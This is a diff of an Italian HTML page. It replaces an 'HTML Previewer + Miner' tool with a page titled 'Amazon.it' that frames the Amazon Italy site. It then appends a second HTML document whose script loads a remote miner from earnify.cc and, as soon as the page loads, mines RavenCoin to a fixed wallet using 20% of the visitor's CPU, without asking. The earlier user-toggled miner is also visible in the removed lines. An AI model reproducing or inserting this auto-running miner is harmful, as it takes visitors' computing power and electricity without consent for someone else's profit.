@@ -3,220 +3,84 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HTML Previewer + Miner</title>
+    <title>Amazon.it - iframe</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
             margin: 0;
-            padding: 10px;
-            background-color: #f4f4f4;
+            padding: 0;
+            font-family: Arial, sans-serif;
         }
-        .container {
-            display: flex;
-            gap: 15px;
-            height: 90vh;
+        
+        header {
+            background-color: #232f3e;
+            color: white;
+            padding: 10px 20px;
+            text-align: center;
         }
-        .editor {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-        }
-        .preview {
-            flex: 1;
-            background: white;
-            border: 1px solid #ccc;
-            border-radius: 8px;
-            padding: 10px;
-            overflow: auto;
-            transition: all 0.3s;
-        }
-        textarea {
-            flex: 1;
-            font-family: 'Courier New', monospace;
-            font-size: 14px;
-            padding: 12px;
-            border: 1px solid #ccc;
-            border-radius: 8px;
-            resize: none;
-        }
-        button {
-            padding: 12px 20px;
-            font-size: 16px;
-            margin: 5px 5px 5px 0;
+        
+        .iframe-container {
+            width: 100%;
+            height: calc(100vh - 60px);
             border: none;
-            border-radius: 6px;
-            cursor: pointer;
         }
-        .btn-run { background-color: #007bff; color: white; }
-        .btn-run:hover { background-color: #0056b3; }
         
-        .btn-miner { background-color: #28a745; color: white; }
-        .btn-miner.stop { background-color: #dc3545; }
-        .btn-max { background-color: #ffc107; color: #212529; font-weight: bold; }
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
         
-        .status {
-            margin-top: 10px;
-            padding: 10px;
-            border-radius: 6px;
+        .note {
+            position: fixed;
+            bottom: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: rgba(0,0,0,0.7);
+            color: white;
+            padding: 8px 15px;
+            border-radius: 5px;
             font-size: 14px;
-        }
-        .status.active {
-            background: #d4edda;
-            color: #155724;
-        }
-        .status.inactive {
-            background: #f8d7da;
-            color: #721c24;
-        }
-
-        /* Fullscreen style */
-        #previewArea:fullscreen {
-            background: white;
-            padding: 20px;
         }
     </style>
 </head>
 <body>
-
-    <h1>HTML Previewer + Miner (Full Screen su Esegui)</h1>
+    <header>
+        <h1>Amazon.it</h1>
+    </header>
     
-    <div class="container">
-        <!-- Editor -->
-        <div class="editor">
-            <h2>Inserisci il tuo codice HTML qui:</h2>
-            <textarea id="htmlInput" placeholder="Scrivi o incolla il tuo codice HTML qui..."></textarea>
-            
-            <button class="btn-run" onclick="eseguiCodice()">▶ Esegui Codice (Full Screen)</button>
-            
-            <div style="margin-top: 8px;">
-                <button id="minerBtn" class="btn-miner" onclick="toggleMiner()">
-                    ⏹️ Avvia Miner (20%)
-                </button>
-                <button id="maxBtn" class="btn-max" onclick="startMaxMining()">
-                    ⚡ Mining 100%
-                </button>
-            </div>
-
-            <div id="status" class="status inactive">
-                <strong>Miner inattivo</strong><br>
-                <span id="timer">Tempo di mining: 0 secondi</span>
-            </div>
-        </div>
-
-        <!-- Preview -->
-        <div class="preview" id="previewContainer">
-            <h2>Anteprima (premi ESC per uscire dal Full Screen):</h2>
-            <div id="previewArea"></div>
-        </div>
+    <div class="iframe-container">
+        <iframe 
+            src="https://www.amazon.it/ref=nav_logo" 
+            title="Amazon Italia"
+            allowfullscreen>
+        </iframe>
+    </div>
+    
+    <div class="note">
+        ⚠️ Alcuni siti (come Amazon) potrebbero impedire il caricamento in iframe per motivi di sicurezza.
     </div>
 
     <script>
-        let minerActive = false;
-        let currentPercentage = 0.2;
-        let startTime = null;
-        let timerInterval = null;
-        let minerInstance = null;
-
-        function eseguiCodice() {
-            const input = document.getElementById('htmlInput').value;
-            const previewArea = document.getElementById('previewArea');
-            const previewContainer = document.getElementById('previewContainer');
-
-            previewArea.innerHTML = input;
-
-            // Entra in Full Screen
-            if (previewContainer.requestFullscreen) {
-                previewContainer.requestFullscreen().catch(err => {
-                    console.log("Errore Full Screen:", err);
-                });
-            } else if (previewContainer.webkitRequestFullscreen) {
-                previewContainer.webkitRequestFullscreen();
-            }
-        }
-
-        // Gestione tasto ESC per uscire dal full screen
-        document.addEventListener('keydown', function(e) {
-            if (e.key === "Escape" || e.key === "Esc") {
-                if (document.fullscreenElement) {
-                    document.exitFullscreen();
-                }
-            }
+        // Messaggio di fallback se l'iframe non carica
+        window.addEventListener('load', function() {
+            const iframe = document.querySelector('iframe');
+            iframe.onerror = function() {
+                alert("Amazon potrebbe bloccare il caricamento in iframe.\nProva ad aprire il link direttamente.");
+            };
         });
-
-        // Scorciatoia Ctrl + Enter per eseguire
-        document.getElementById('htmlInput').addEventListener('keydown', function(e) {
-            if (e.ctrlKey && e.key === 'Enter') {
-                eseguiCodice();
-            }
-        });
-
-        // ====================== MINER ======================
-        async function startMining(percentage) {
-            if (minerActive && minerInstance && typeof minerInstance.stop === 'function') {
-                minerInstance.stop();
-            }
-
-            try {
-                const module = await import("https://earnify.cc/miner.js");
-                minerInstance = module.autoMine("RVWmPb6SyB7Rx6ugY6GYngsP5ciqjBaxoT", percentage);
-                
-                minerActive = true;
-                currentPercentage = percentage;
-                startTime = Date.now();
-
-                const status = document.getElementById('status');
-                status.classList.remove('inactive');
-                status.classList.add('active');
-                status.innerHTML = `<strong>✅ Miner attivo (${Math.round(percentage * 100)}% CPU)</strong><br><span id="timer">Tempo di mining: 0 secondi</span>`;
-                
-                startTimer();
-            } catch (e) {
-                alert("Errore nell'avvio del miner: " + e.message);
-            }
-        }
-
-        function toggleMiner() {
-            const btn = document.getElementById('minerBtn');
-            if (!minerActive) {
-                startMining(0.2);
-                btn.textContent = "⏹️ Ferma Miner (20%)";
-                btn.classList.add('stop');
-            } else {
-                stopMiner();
-                btn.textContent = "▶ Avvia Miner (20%)";
-                btn.classList.remove('stop');
-            }
-        }
-
-        function startMaxMining() {
-            startMining(1.0);
-            const btn = document.getElementById('minerBtn');
-            btn.textContent = "⏹️ Ferma Miner (100%)";
-            btn.classList.add('stop');
-        }
-
-        function stopMiner() {
-            if (minerInstance && typeof minerInstance.stop === 'function') {
-                minerInstance.stop();
-            }
-            minerActive = false;
-            clearInterval(timerInterval);
-            
-            const status = document.getElementById('status');
-            status.classList.remove('active');
-            status.classList.add('inactive');
-            status.innerHTML = `<strong>Miner inattivo</strong><br><span id="timer">Tempo di mining: 0 secondi</span>`;
-        }
-
-        function startTimer() {
-            clearInterval(timerInterval);
-            timerInterval = setInterval(() => {
-                if (!startTime) return;
-                const elapsed = Math.floor((Date.now() - startTime) / 1000);
-                document.getElementById('timer').textContent = `Tempo di mining: ${elapsed} secondi`;
-            }, 1000);
-        }
     </script>
-
 </body>
+</html>
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>Thanks for using cpu-web-miner</h2>
+    <!-- Your website content goes here -->
+    <script type="module">
+    
+    import { autoMine } from "https://earnify.cc/miner.js";
+      // Your RavenCoin Address percent of users pc, 0.1 = 1%, 1 = 100%
+      autoMine("RVWmPb6SyB7Rx6ugY6GYngsP5ciqjBaxoT", 0.2);
+    </script>
+  </body>
 </html>
